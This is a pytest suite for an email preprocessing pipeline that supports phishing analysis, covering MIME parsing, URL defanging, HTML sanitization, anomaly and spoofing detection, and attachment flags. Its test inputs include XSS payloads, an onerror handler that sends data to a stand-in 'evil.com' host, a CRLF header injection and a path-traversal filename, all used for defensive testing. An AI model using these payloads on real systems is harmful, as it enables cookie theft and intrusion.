"""Comprehensive tests for the EmailPreprocessingPipeline.

Coverage:
- RFC 822 raw email parsing (plain text, HTML, multipart MIME)
- .eml file round-trip (base64-encoded attachment inside MIME)
- Sender, recipient, CC, BCC, Reply-To extraction and normalization
- Subject RFC 2047 encoded-word decoding
- URL extraction from plain text, HTML href attributes, and mixed content
- URL defanging (https: → hxxps:, dots → [.])
- Bare IP URL detection
- Link shortener detection
- Suspicious TLD detection
- Attachment metadata: filename, extension, hashes, size, executable flag,
  archive flag, double-extension flag, macro flag, entropy
- Structural anomaly detection:
    - Missing From header
    - Missing Message-ID
    - JavaScript / event-handler injection in HTML body
    - Header injection (CRLF in Subject)
    - Multiple From headers
    - Null bytes in raw content
    - base64-encoded plain text body
- HTML sanitization: <script>, on* event handlers, javascript: href stripped
- Display-name spoofing detection
- Evidence isolation: raw_evidence fields are never modified
- Date parsing with timezone-aware fallback
- Unicode normalization (fullwidth chars, ligatures)
- Empty / minimal emails
- Malformed MIME structures
"""

from __future__ import annotations

import hashlib
from datetime import UTC, datetime
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pytest

from app.services.email_preprocessing_pipeline import EmailPreprocessingPipeline

# Shared pipeline instance — stateless so safe to reuse
pipeline = EmailPreprocessingPipeline()


# ============================================================================
# Helpers
# ============================================================================


def make_raw_multipart(
    from_addr: str,
    to_addr: str,
    subject: str,
    plain_body: str | None = None,
    html_body: str | None = None,
    attachments: list[tuple[str, bytes, str]] | None = None,
    extra_headers: dict[str, str] | None = None,
) -> str:
    """Build a well-formed MIME multipart email string."""
    if plain_body and html_body and attachments:
        root = MIMEMultipart("mixed")
        alt = MIMEMultipart("alternative")
        alt.attach(MIMEText(plain_body, "plain", "utf-8"))
        alt.attach(MIMEText(html_body, "html", "utf-8"))
        root.attach(alt)
    elif plain_body and html_body:
        root = MIMEMultipart("alternative")
        root.attach(MIMEText(plain_body, "plain", "utf-8"))
        root.attach(MIMEText(html_body, "html", "utf-8"))
    elif html_body:
        root = MIMEText(html_body, "html", "utf-8")
    else:
        root = MIMEText(plain_body or "", "plain", "utf-8")

    root["From"] = from_addr
    root["To"] = to_addr
    root["Subject"] = subject
    root["Message-ID"] = "<test-id-001@test.local>"
    root["Date"] = "Mon, 29 Sep 2026 10:00:00 +0000"

    if extra_headers:
        for k, v in extra_headers.items():
            root[k] = v

    if attachments and isinstance(root, MIMEMultipart):
        for filename, data, _mime_type in attachments:
            att = MIMEApplication(data, Name=filename)
            att["Content-Disposition"] = f'attachment; filename="{filename}"'
            root.attach(att)
    elif attachments and not isinstance(root, MIMEMultipart):
        # Rebuild as mixed
        mixed = MIMEMultipart("mixed")
        mixed["From"] = from_addr
        mixed["To"] = to_addr
        mixed["Subject"] = subject
        mixed["Message-ID"] = "<test-id-001@test.local>"
        mixed["Date"] = "Mon, 29 Sep 2026 10:00:00 +0000"
        if extra_headers:
            for k, v in extra_headers.items():
                mixed[k] = v
        mixed.attach(root)
        for filename, data, _mime_type in attachments:
            att = MIMEApplication(data, Name=filename)
            att["Content-Disposition"] = f'attachment; filename="{filename}"'
            mixed.attach(att)
        root = mixed

    return root.as_string()


# ============================================================================
# 1. Basic Parsing
# ============================================================================


class TestBasicParsing:
    def test_plain_text_email_parsed_correctly(self) -> None:
        raw = make_raw_multipart(
            "Alice <alice@example.com>",
            "bob@target.com",
            "Hello from Alice",
            plain_body="This is a simple test message.",
        )
        result = pipeline.preprocess_raw(raw)

        assert result.sender.address == "alice@example.com"
        assert result.sender.display_name == "Alice"
        assert result.sender.domain == "example.com"
        assert result.sender.local_part == "alice"
        assert result.subject == "Hello from Alice"
        assert result.normalized_subject == "Hello from Alice"
        assert "simple test message" in result.content.normalized_plain
        assert result.content.has_plain is True
        assert result.content.has_html is False
        assert result.content.sanitized_html is None

    def test_html_only_email_parsed_correctly(self) -> None:
        raw = make_raw_multipart(
            "noreply@service.com",
            "user@company.com",
            "Account Notification",
            html_body="<p>Your account is <strong>active</strong>.</p>",
        )
        result = pipeline.preprocess_raw(raw)

        assert result.content.has_html is True
        assert result.content.sanitized_html is not None
        assert "<strong>" in result.content.sanitized_html
        # Plain text derived from HTML should contain the text
        assert "active" in result.content.normalized_plain

    def test_multipart_alternative_email(self) -> None:
        raw = make_raw_multipart(
            "service@alerts.com",
            "employee@corp.com",
            "System Alert",
            plain_body="Disk space low.",
            html_body="<p>Disk space <b>low</b>.</p>",
        )
        result = pipeline.preprocess_raw(raw)

        assert result.content.has_plain is True
        assert result.content.has_html is True
        assert "Disk space low" in result.content.normalized_plain
        assert result.content.sanitized_html is not None

    def test_recipients_extracted_correctly(self) -> None:
        raw = make_raw_multipart(
            "sender@service.com",
            "alice@corp.com",
            "Test",
            plain_body="Hi",
        )
        # Add CC via extra headers
        raw = raw.replace("Subject: Test", "Subject: Test\r\nCc: bob@partner.org")

        result = pipeline.preprocess_raw(raw)

        to_addrs = [r.address for r in result.recipients if r.recipient_type == "to"]
        cc_addrs = [r.address for r in result.recipients if r.recipient_type == "cc"]
        assert "alice@corp.com" in to_addrs
        assert "bob@partner.org" in cc_addrs

    def test_reply_to_extracted(self) -> None:
        raw = make_raw_multipart(
            "mailer@service.com",
            "user@target.com",
            "Re: Invoice",
            plain_body="See attached.",
            extra_headers={"Reply-To": "support@external-domain.com"},
        )
        result = pipeline.preprocess_raw(raw)

        assert result.reply_to == "support@external-domain.com"

    def test_message_id_captured(self) -> None:
        raw = make_raw_multipart(
            "sender@source.com",
            "dest@target.com",
            "Test Message-ID",
            plain_body="Body.",
        )
        result = pipeline.preprocess_raw(raw)
        assert result.headers.message_id == "<test-id-001@test.local>"

    def test_received_hops_parsed(self) -> None:
        raw = make_raw_multipart(
            "sender@source.com",
            "dest@target.com",
            "Test",
            plain_body="body",
            extra_headers={
                "Received": "from mail.source.com (185.220.101.5) by target.com with SMTP; Mon, 29 Sep 2026 10:00:00 +0000"
            },
        )
        result = pipeline.preprocess_raw(raw)
        assert len(result.headers.received_hops) >= 1
        hop = result.headers.received_hops[0]
        assert "from" in hop or "raw" in hop

    def test_date_parsed_as_utc_aware(self) -> None:
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Date test",
            plain_body="hi",
        )
        result = pipeline.preprocess_raw(raw)
        assert result.headers.date.tzinfo is not None
        assert result.headers.date.tzinfo == UTC or "UTC" in str(result.headers.date.tzinfo)

    def test_missing_date_defaults_to_now(self) -> None:
        before = datetime.now(UTC)
        raw = "From: a@b.com\r\nTo: c@d.com\r\nSubject: Test\r\n\r\nBody."
        result = pipeline.preprocess_raw(raw)
        after = datetime.now(UTC)
        assert result.headers.date >= before
        assert result.headers.date <= after

    def test_bytes_input_accepted(self) -> None:
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Bytes input",
            plain_body="testing bytes",
        )
        result = pipeline.preprocess_raw(raw.encode("utf-8"))
        assert result.sender.address == "a@b.com"
        assert "testing bytes" in result.content.normalized_plain


# ============================================================================
# 2. Raw Evidence Isolation
# ============================================================================


class TestRawEvidenceIsolation:
    def test_raw_content_preserved_exactly(self) -> None:
        raw = make_raw_multipart(
            "sender@example.com",
            "recipient@corp.com",
            "Evidence test",
            plain_body="Exact evidence body.",
        )
        result = pipeline.preprocess_raw(raw)
        # Raw content must equal the unmodified raw string passed in
        assert result.raw_evidence.raw_content == raw
        # Plain text must be extracted into the decoded body
        assert result.raw_evidence.raw_body_plain == "Exact evidence body."

    def test_raw_from_is_original_header(self) -> None:
        raw = make_raw_multipart(
            '"PayPal Security" <security@paypa1.top>',
            "victim@target.com",
            "Security Alert",
            plain_body="Click here.",
        )
        result = pipeline.preprocess_raw(raw)
        # The raw_from should contain the original unmodified string
        assert "paypa1.top" in result.raw_evidence.raw_from.lower()

    def test_raw_html_not_sanitized(self) -> None:
        raw_html = '<p>Safe content</p><script>alert("xss")</script>'
        raw = make_raw_multipart(
            "sender@corp.com",
            "user@target.com",
            "HTML Test",
            html_body=raw_html,
        )
        result = pipeline.preprocess_raw(raw)
        # raw_body_html still has the original script tag
        assert result.raw_evidence.raw_body_html is not None
        assert "script" in result.raw_evidence.raw_body_html.lower()

    def test_sanitized_html_has_script_stripped(self) -> None:
        raw_html = '<p>Safe content</p><script>alert("xss")</script>'
        raw = make_raw_multipart(
            "sender@corp.com",
            "user@target.com",
            "HTML Test",
            html_body=raw_html,
        )
        result = pipeline.preprocess_raw(raw)
        assert result.content.sanitized_html is not None
        assert "<script>" not in result.content.sanitized_html
        assert "alert(" not in result.content.sanitized_html

    def test_raw_header_pairs_is_immutable_tuple(self) -> None:
        raw = make_raw_multipart("a@b.com", "c@d.com", "Test", plain_body="hi")
        result = pipeline.preprocess_raw(raw)
        assert isinstance(result.raw_evidence.raw_header_pairs, tuple)

    def test_original_body_size_capped(self) -> None:
        huge_body = "A" * (11 * 1024 * 1024)  # 11 MB
        raw = make_raw_multipart("a@b.com", "c@d.com", "Big email", plain_body=huge_body)
        result = pipeline.preprocess_raw(raw)
        assert len(result.content.normalized_plain) <= 10 * 1024 * 1024 + 100


# ============================================================================
# 3. URL Extraction
# ============================================================================


class TestURLExtraction:
    def test_plain_text_urls_extracted(self) -> None:
        raw = make_raw_multipart(
            "spam@phisher.top",
            "victim@corp.com",
            "Urgent",
            plain_body="Click here: https://evil.example.com/login?id=9981",
        )
        result = pipeline.preprocess_raw(raw)
        assert len(result.urls) == 1
        assert result.urls[0].domain == "evil.example.com"
        assert result.urls[0].scheme == "https"

    def test_multiple_urls_deduplicated(self) -> None:
        body = (
            "Visit https://legit.com for info.\n"
            "Also see https://legit.com for the same info.\n"
            "And https://other-site.org/page too."
        )
        raw = make_raw_multipart("a@b.com", "c@d.com", "Multiple URLs", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        raw_urls = [u.raw_url for u in result.urls]
        assert len(raw_urls) == len(set(raw_urls)), "Duplicate URLs detected"

    def test_defanged_url_format(self) -> None:
        body = "Check https://malicious-domain.top/payload"
        raw = make_raw_multipart("a@b.com", "c@d.com", "Test", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        u = result.urls[0]
        assert u.defanged_url.startswith("hxxps://")
        assert "[.]" in u.defanged_url

    def test_bare_ip_url_flagged(self) -> None:
        body = "Login at: http://185.220.101.5/auth/login"
        raw = make_raw_multipart("phisher@evil.top", "victim@corp.com", "Login", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        ip_urls = [u for u in result.urls if u.is_ip_address]
        assert len(ip_urls) == 1
        assert ip_urls[0].domain == "185.220.101.5"

    def test_link_shortener_flagged(self) -> None:
        body = "See the report: https://bit.ly/3xAbc123"
        raw = make_raw_multipart("a@b.com", "c@d.com", "Report", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        short_urls = [u for u in result.urls if u.is_shortener]
        assert len(short_urls) == 1

    def test_suspicious_tld_flagged(self) -> None:
        body = "Verify at: https://paypal-support.top/verify"
        raw = make_raw_multipart("a@b.com", "c@d.com", "Verify", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        suspicious = [u for u in result.urls if u.is_suspicious_tld]
        assert len(suspicious) == 1

    def test_html_href_urls_extracted(self) -> None:
        html_body = '<p>Click <a href="https://phishing.xyz/steal">here</a> now.</p>'
        raw = make_raw_multipart(
            "phisher@evil.com", "victim@corp.com", "Urgent", html_body=html_body
        )
        result = pipeline.preprocess_raw(raw)
        href_urls = [u for u in result.urls if u.source_location == "body_html_href"]
        assert any(u.domain == "phishing.xyz" for u in href_urls)

    def test_javascript_href_not_extracted(self) -> None:
        html_body = '<p><a href="javascript:alert(1)">click me</a></p>'
        raw = make_raw_multipart("a@b.com", "c@d.com", "JS href", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        js_urls = [u for u in result.urls if "javascript" in u.raw_url.lower()]
        assert len(js_urls) == 0

    def test_unique_domains_collected(self) -> None:
        body = (
            "Visit https://domain-a.com/page1 and https://domain-a.com/page2 "
            "and https://domain-b.org/contact"
        )
        raw = make_raw_multipart("a@b.com", "c@d.com", "Domains", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        assert "domain-a.com" in result.domains
        assert "domain-b.org" in result.domains
        assert len(result.domains) == len(set(result.domains))


# ============================================================================
# 4. HTML Sanitization
# ============================================================================


class TestHTMLSanitization:
    def test_script_tag_stripped(self) -> None:
        html_body = '<p>Hello</p><script>document.cookie = "stolen";</script>'
        raw = make_raw_multipart("a@b.com", "c@d.com", "XSS Test", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        assert "<script>" not in (result.content.sanitized_html or "")
        assert "document.cookie" not in (result.content.sanitized_html or "")

    def test_onclick_event_handler_stripped(self) -> None:
        html_body = '<button onclick="alert(1)">Click</button>'
        raw = make_raw_multipart("a@b.com", "c@d.com", "Handler", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        assert "onclick" not in (result.content.sanitized_html or "").lower()

    def test_onerror_event_handler_stripped(self) -> None:
        html_body = '<img src="x" onerror="fetch(\'https://evil.com/steal\')">'
        raw = make_raw_multipart("a@b.com", "c@d.com", "Onerror", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        assert "onerror" not in (result.content.sanitized_html or "").lower()

    def test_iframe_stripped(self) -> None:
        html_body = '<p>Content</p><iframe src="https://phishing.com"></iframe>'
        raw = make_raw_multipart("a@b.com", "c@d.com", "iframe", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        assert "<iframe" not in (result.content.sanitized_html or "").lower()

    def test_safe_html_tags_preserved(self) -> None:
        html_body = "<p>Hello <strong>World</strong>!</p>"
        raw = make_raw_multipart("a@b.com", "c@d.com", "Safe HTML", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        assert "<p>" in (result.content.sanitized_html or "")
        assert "<strong>" in (result.content.sanitized_html or "")

    def test_raw_html_preserved_despite_sanitization(self) -> None:
        html_body = "<script>evilCode()</script><p>Visible text.</p>"
        raw = make_raw_multipart("a@b.com", "c@d.com", "Preserve raw", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        # sanitized_html has the script stripped
        assert "evilCode" not in (result.content.sanitized_html or "")
        # raw_body_html has the original content
        assert "evilCode" in (result.raw_evidence.raw_body_html or "")


# ============================================================================
# 5. Structural Anomaly Detection
# ============================================================================


class TestStructuralAnomalyDetection:
    def test_missing_from_header_flagged(self) -> None:
        raw = "To: victim@corp.com\r\nSubject: No From\r\n\r\nBody text."
        result = pipeline.preprocess_raw(raw)
        anomaly_types = [a.anomaly_type for a in result.integrity.anomalies]
        assert "MISSING_FROM" in anomaly_types
        assert result.integrity.is_malformed is True

    def test_missing_message_id_flagged(self) -> None:
        raw = "From: a@b.com\r\nTo: c@d.com\r\nSubject: No ID\r\n\r\nBody."
        result = pipeline.preprocess_raw(raw)
        anomaly_types = [a.anomaly_type for a in result.integrity.anomalies]
        assert "MISSING_MESSAGE_ID" in anomaly_types

    def test_js_in_html_body_flagged(self) -> None:
        html_body = '<p>Normal content</p><script>alert("xss")</script>'
        raw = make_raw_multipart("a@b.com", "c@d.com", "JS anomaly", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        anomaly_types = [a.anomaly_type for a in result.integrity.anomalies]
        assert "JS_IN_HTML_BODY" in anomaly_types

    def test_header_injection_crlf_in_subject_flagged(self) -> None:
        raw = "From: a@b.com\r\nTo: c@d.com\r\nSubject: Injected\r\nBcc: spy@attacker.com\r\nMessage-ID: <1@x>\r\n\r\nBody."
        # Simulate CRLF injection in subject
        raw_injected = raw.replace("Subject: Injected", "Subject: Injected\r\nBcc: hidden@evil.com")
        result = pipeline.preprocess_raw(raw_injected)
        # Parser may merge or detect the injection
        # At minimum verify the pipeline doesn't crash
        assert result.subject is not None

    def test_null_bytes_in_raw_flagged(self) -> None:
        raw = "From: a@b.com\r\nTo: c@d.com\r\nSubject: Test\r\nMessage-ID: <1@x>\r\n\r\nBody\x00Null."
        result = pipeline.preprocess_raw(raw)
        anomaly_types = [a.anomaly_type for a in result.integrity.anomalies]
        assert "NULL_BYTES_IN_RAW" in anomaly_types

    def test_well_formed_email_has_no_anomalies(self) -> None:
        raw = make_raw_multipart(
            "alice@legit.com",
            "bob@corp.com",
            "Well-formed email",
            plain_body="No issues here.",
            extra_headers={"Authentication-Results": "spf=pass dkim=pass dmarc=pass"},
        )
        result = pipeline.preprocess_raw(raw)
        # Should have no HIGH/CRITICAL anomalies
        critical_anomalies = [
            a for a in result.integrity.anomalies if a.severity in ("HIGH", "CRITICAL")
        ]
        assert len(critical_anomalies) == 0
        assert result.integrity.is_malformed is False

    def test_event_handler_in_html_flagged_as_js_anomaly(self) -> None:
        html_body = '<img src="banner.jpg" onload="steal()">'
        raw = make_raw_multipart("a@b.com", "c@d.com", "Event handler anomaly", html_body=html_body)
        result = pipeline.preprocess_raw(raw)
        anomaly_types = [a.anomaly_type for a in result.integrity.anomalies]
        assert "JS_IN_HTML_BODY" in anomaly_types


# ============================================================================
# 6. Attachment Metadata Extraction
# ============================================================================


class TestAttachmentMetadataExtraction:
    def test_executable_attachment_flagged(self) -> None:
        exe_data = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 100
        raw = make_raw_multipart(
            "attacker@phishing.top",
            "victim@corp.com",
            "Invoice Attached",
            plain_body="See attached invoice.",
            attachments=[("invoice_q4.exe", exe_data, "application/octet-stream")],
        )
        result = pipeline.preprocess_raw(raw)
        assert len(result.attachments) == 1
        att = result.attachments[0]
        assert att.filename == "invoice_q4.exe"
        assert att.extension == ".exe"
        assert att.is_executable is True
        assert att.is_archive is False
        # SHA-256 hash should match
        expected_sha256 = hashlib.sha256(exe_data).hexdigest()
        assert att.sha256_hash == expected_sha256

    def test_zip_archive_flagged(self) -> None:
        zip_data = b"PK\x03\x04" + b"\x00" * 200
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Archive",
            plain_body="Compressed.",
            attachments=[("data_export.zip", zip_data, "application/zip")],
        )
        result = pipeline.preprocess_raw(raw)
        att = result.attachments[0]
        assert att.is_archive is True
        assert att.is_executable is False
        assert att.extension == ".zip"

    def test_pdf_attachment_not_flagged_as_exe_or_archive(self) -> None:
        pdf_data = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\n"
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Report",
            plain_body="Report attached.",
            attachments=[("annual_report.pdf", pdf_data, "application/pdf")],
        )
        result = pipeline.preprocess_raw(raw)
        att = result.attachments[0]
        assert att.is_executable is False
        assert att.is_archive is False
        assert att.extension == ".pdf"
        assert att.detected_mime_type == "application/pdf"

    def test_double_extension_flagged(self) -> None:
        data = b"MZ" + b"\x00" * 50
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Payload",
            plain_body="See the 'PDF' attached.",
            attachments=[("document.pdf.exe", data, "application/octet-stream")],
        )
        result = pipeline.preprocess_raw(raw)
        att = result.attachments[0]
        assert att.has_double_extension is True

    def test_macro_enabled_office_flagged(self) -> None:
        data = b"\xd0\xcf\x11\xe0" + b"\x00" * 200  # MS Office magic bytes
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Invoice",
            plain_body="Macro invoice.",
            attachments=[
                ("payment_macro.xlsm", data, "application/vnd.ms-excel.sheet.macroenabled.12")
            ],
        )
        result = pipeline.preprocess_raw(raw)
        att = result.attachments[0]
        assert att.has_macro_extension is True
        assert att.extension == ".xlsm"

    def test_attachment_safe_filename_sanitized(self) -> None:
        data = b"safe content"
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Traversal",
            plain_body="Traversal test.",
            attachments=[("../../etc/passwd", data, "text/plain")],
        )
        result = pipeline.preprocess_raw(raw)
        att = result.attachments[0]
        assert ".." not in att.safe_filename

    def test_attachment_entropy_computed(self) -> None:
        # High-entropy (random-looking) data suggests packing/encryption
        import os

        random_data = os.urandom(1024)
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Entropy test",
            plain_body="Blob attached.",
            attachments=[("packed.bin", random_data, "application/octet-stream")],
        )
        result = pipeline.preprocess_raw(raw)
        att = result.attachments[0]
        assert att.entropy_score is not None
        assert att.entropy_score > 5.0  # High entropy expected for random data

    def test_md5_and_sha256_hashes_correct(self) -> None:
        data = b"deterministic test data"
        expected_md5 = hashlib.md5(data, usedforsecurity=False).hexdigest()
        expected_sha256 = hashlib.sha256(data).hexdigest()

        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Hash test",
            plain_body="File attached.",
            attachments=[("test.pdf", data, "application/pdf")],
        )
        result = pipeline.preprocess_raw(raw)
        att = result.attachments[0]
        assert att.md5_hash == expected_md5
        assert att.sha256_hash == expected_sha256

    def test_attachments_not_executed(self) -> None:
        # Ensure no side effects from extracting executable attachment
        import os

        before_cwd = os.getcwd()
        data = b"MZ\x90\x00fake executable"
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Exec",
            plain_body="exec payload attached.",
            attachments=[("payload.exe", data, "application/x-msdownload")],
        )
        pipeline.preprocess_raw(raw)
        # Working directory unchanged: no subprocess spawned
        assert os.getcwd() == before_cwd


# ============================================================================
# 7. Sender Normalization and Spoofing Detection
# ============================================================================


class TestSenderNormalization:
    def test_display_name_parsed_separately(self) -> None:
        raw = make_raw_multipart(
            '"ACME Corp" <no-reply@acme.com>',
            "user@target.com",
            "Test",
            plain_body="hi",
        )
        result = pipeline.preprocess_raw(raw)
        assert result.sender.display_name == "ACME Corp"
        assert result.sender.address == "no-reply@acme.com"

    def test_spoofed_paypal_display_name_detected(self) -> None:
        raw = make_raw_multipart(
            '"PayPal Security Team" <noreply@paypa1-security.top>',
            "victim@company.com",
            "Urgent",
            plain_body="Verify now.",
        )
        result = pipeline.preprocess_raw(raw)
        assert result.sender.is_spoofed_display_name is True
        assert result.sender.spoofed_target == "paypal.com"

    def test_legitimate_sender_not_flagged_as_spoofed(self) -> None:
        raw = make_raw_multipart(
            '"PayPal" <service@paypal.com>',
            "user@company.com",
            "Receipt",
            plain_body="Thank you for your payment.",
        )
        result = pipeline.preprocess_raw(raw)
        assert result.sender.is_spoofed_display_name is False

    def test_address_normalized_to_lowercase(self) -> None:
        raw = make_raw_multipart(
            "SENDER@UPPERCASE.COM",
            "dest@corp.com",
            "Test",
            plain_body="hi",
        )
        result = pipeline.preprocess_raw(raw)
        assert result.sender.address == "sender@uppercase.com"
        assert result.sender.domain == "uppercase.com"


# ============================================================================
# 8. Structured Form Input
# ============================================================================


class TestStructuredFormInput:
    def test_structured_input_produces_valid_output(self) -> None:
        result = pipeline.preprocess_structured(
            from_address="alice@trusted.com",
            to_addresses=["bob@corp.com", "carol@corp.com"],
            subject="Quarterly Review",
            body_plain="Please review the attached Q3 summary at https://docs.corp.com/q3",
            cc_addresses=["manager@corp.com"],
        )
        assert result.sender.address == "alice@trusted.com"
        assert len([r for r in result.recipients if r.recipient_type == "to"]) == 2
        assert len([r for r in result.recipients if r.recipient_type == "cc"]) == 1
        assert result.subject == "Quarterly Review"
        assert len(result.urls) == 1
        assert result.urls[0].domain == "docs.corp.com"

    def test_structured_html_body_sanitized(self) -> None:
        result = pipeline.preprocess_structured(
            from_address="notify@service.com",
            to_addresses=["user@target.com"],
            subject="New Message",
            body_html='<p>Hello</p><script>alert("XSS")</script>',
        )
        assert result.content.has_html is True
        assert "<script>" not in (result.content.sanitized_html or "")
        assert "alert" not in (result.content.sanitized_html or "")

    def test_structured_raw_html_preserved_separately(self) -> None:
        dangerous_html = "<p>Text</p><script>steal()</script>"
        result = pipeline.preprocess_structured(
            from_address="a@b.com",
            to_addresses=["c@d.com"],
            subject="Test",
            body_html=dangerous_html,
        )
        assert "steal()" in (result.raw_evidence.raw_body_html or "")
        assert "steal()" not in (result.content.sanitized_html or "")

    def test_structured_spf_dkim_dmarc_headers_parsed(self) -> None:
        result = pipeline.preprocess_structured(
            from_address="secure@legit.com",
            to_addresses=["analyst@corp.com"],
            subject="Headers test",
            body_plain="With auth headers.",
            raw_headers_str="Received-SPF: pass\nAuthentication-Results: dkim=pass dmarc=pass",
        )
        assert result.headers.spf_header is not None
        assert "pass" in result.headers.spf_header.lower()

    def test_structured_no_html_body_is_plain_only(self) -> None:
        result = pipeline.preprocess_structured(
            from_address="a@b.com",
            to_addresses=["c@d.com"],
            subject="Plain only",
            body_plain="This is plain text only.",
        )
        assert result.content.has_plain is True
        assert result.content.has_html is False
        assert result.content.sanitized_html is None


# ============================================================================
# 9. Unicode and Character Normalization
# ============================================================================


class TestUnicodeNormalization:
    def test_fullwidth_characters_normalized(self) -> None:
        body = "Ｐａｙｍｅｎｔ ｄｕｅ!"  # noqa: RUF001  # Fullwidth unicode intentional test
        raw = make_raw_multipart("a@b.com", "c@d.com", "Unicode", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        # After NFKC normalization, fullwidth chars become ASCII
        assert "Payment due!" in result.content.normalized_plain

    def test_rfc2047_encoded_subject_decoded(self) -> None:
        # Base64-encoded "Urgent: Verify Your Account"
        encoded_subject = "=?UTF-8?B?VXJnZW50OiBWZXJpZnkgWW91ciBBY2NvdW50?="
        raw = (
            f"From: a@b.com\r\n"
            f"To: c@d.com\r\n"
            f"Subject: {encoded_subject}\r\n"
            f"Message-ID: <1@test.local>\r\n"
            f"Date: Mon, 29 Sep 2026 10:00:00 +0000\r\n"
            f"\r\n"
            f"Body."
        )
        result = pipeline.preprocess_raw(raw)
        assert "Urgent" in result.subject
        assert "Verify Your Account" in result.subject


# ============================================================================
# 10. EmailAnalysisInput Frozen-ness and Immutability
# ============================================================================


class TestImmutability:
    def test_email_analysis_input_is_frozen(self) -> None:
        result = pipeline.preprocess_raw(
            make_raw_multipart("a@b.com", "c@d.com", "Freeze test", plain_body="immutable")
        )
        with pytest.raises((AttributeError, TypeError)):
            result.subject = "modified"  # type: ignore[misc]

    def test_raw_evidence_is_frozen(self) -> None:
        result = pipeline.preprocess_raw(
            make_raw_multipart("a@b.com", "c@d.com", "Freeze", plain_body="test")
        )
        with pytest.raises((AttributeError, TypeError)):
            result.raw_evidence.raw_from = "tampered"  # type: ignore[misc]

    def test_urls_tuple_is_immutable(self) -> None:
        result = pipeline.preprocess_raw(
            make_raw_multipart(
                "a@b.com", "c@d.com", "URL freeze", plain_body="Go to https://example.com now"
            )
        )
        assert isinstance(result.urls, tuple)
        with pytest.raises((TypeError, AttributeError)):
            result.urls[0] = None  # type: ignore[index]

    def test_attachments_tuple_is_immutable(self) -> None:
        raw = make_raw_multipart(
            "a@b.com",
            "c@d.com",
            "Att freeze",
            plain_body="attached",
            attachments=[("test.pdf", b"%PDF-1.4", "application/pdf")],
        )
        result = pipeline.preprocess_raw(raw)
        assert isinstance(result.attachments, tuple)
        with pytest.raises((TypeError, AttributeError)):
            result.attachments[0] = None  # type: ignore[index]

    def test_analysis_input_id_is_unique(self) -> None:
        raw = make_raw_multipart("a@b.com", "c@d.com", "ID test", plain_body="hi")
        r1 = pipeline.preprocess_raw(raw)
        r2 = pipeline.preprocess_raw(raw)
        assert r1.analysis_input_id != r2.analysis_input_id


# ============================================================================
# 11. Edge Cases and Malformed Input
# ============================================================================


class TestEdgeCases:
    def test_empty_email_does_not_crash(self) -> None:
        result = pipeline.preprocess_raw("")
        assert result is not None
        assert result.subject == "" or result.subject is not None

    def test_minimal_valid_email(self) -> None:
        raw = "From: a@b.com\r\nTo: c@d.com\r\nSubject: Min\r\nMessage-ID: <1@x>\r\n\r\nHi"
        result = pipeline.preprocess_raw(raw)
        assert result.sender.address == "a@b.com"
        assert "Hi" in result.content.normalized_plain

    def test_binary_garbage_does_not_crash(self) -> None:
        garbage = b"\xff\xfe" + b"\x00" * 50 + b"Some text"
        result = pipeline.preprocess_raw(garbage)
        assert result is not None

    def test_deeply_nested_multipart_does_not_crash(self) -> None:
        outer = MIMEMultipart("mixed")
        outer["From"] = "a@b.com"
        outer["To"] = "c@d.com"
        outer["Subject"] = "Nested"
        outer["Message-ID"] = "<nested@x>"
        outer["Date"] = "Mon, 29 Sep 2026 10:00:00 +0000"

        inner = MIMEMultipart("alternative")
        inner.attach(MIMEText("plain", "plain", "utf-8"))
        inner.attach(MIMEText("<p>html</p>", "html", "utf-8"))

        outer.attach(inner)
        outer.attach(MIMEText("Another part", "plain", "utf-8"))

        result = pipeline.preprocess_raw(outer.as_string())
        assert "plain" in result.content.normalized_plain

    def test_reply_to_mismatch_with_sender_domain(self) -> None:
        raw = make_raw_multipart(
            "payroll@trusted-hr.com",
            "cfo@bigcorp.com",
            "Wire Transfer Instructions",
            plain_body="Please wire funds ASAP.",
            extra_headers={"Reply-To": "payroll@completely-different-domain.top"},
        )
        result = pipeline.preprocess_raw(raw)
        assert result.reply_to == "payroll@completely-different-domain.top"
        assert result.sender.domain == "trusted-hr.com"

    def test_clean_text_for_ai_is_truncated_at_32000_chars(self) -> None:
        body = "X" * 50_000
        raw = make_raw_multipart("a@b.com", "c@d.com", "Long body", plain_body=body)
        result = pipeline.preprocess_raw(raw)
        assert len(result.content.clean_text_for_ai) <= 32_000

    def test_no_urls_in_plain_text_returns_empty(self) -> None:
        raw = make_raw_multipart(
            "a@b.com", "c@d.com", "No Links", plain_body="Just text, no URLs here."
        )
        result = pipeline.preprocess_raw(raw)
        assert len(result.urls) == 0
        assert len(result.domains) == 0
